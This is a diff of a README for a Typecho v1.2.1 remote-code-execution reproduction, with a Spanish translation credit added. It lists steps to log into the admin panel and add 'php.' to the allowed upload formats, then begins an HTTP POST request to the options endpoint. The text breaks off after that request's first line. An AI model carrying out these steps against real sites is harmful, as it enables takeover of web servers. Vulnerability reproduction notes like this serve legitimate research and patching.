@@ -1,8 +1,11 @@
 # Typecho-v1.2.1-RCE
 typecho-v1.2.1-RCE
 
+Edición traducida de la fuente [https://github.com/MentalityXt/typecho-v1.2.1-RCE]
+
 ## Vulnerability to reproduce
 Log in to the backend of the website. Locate the /admin/options-general.php file and add 'php.' to the '其他格式' `otros formatos` section at the bottom. Then click on '保存设置' `Guardar Ajustes` 
+
 
 ```php
 POST /typecho/index.php/action/options-general?_=7f7f3849a454840627316bb52364d2fc HTTP/1.1
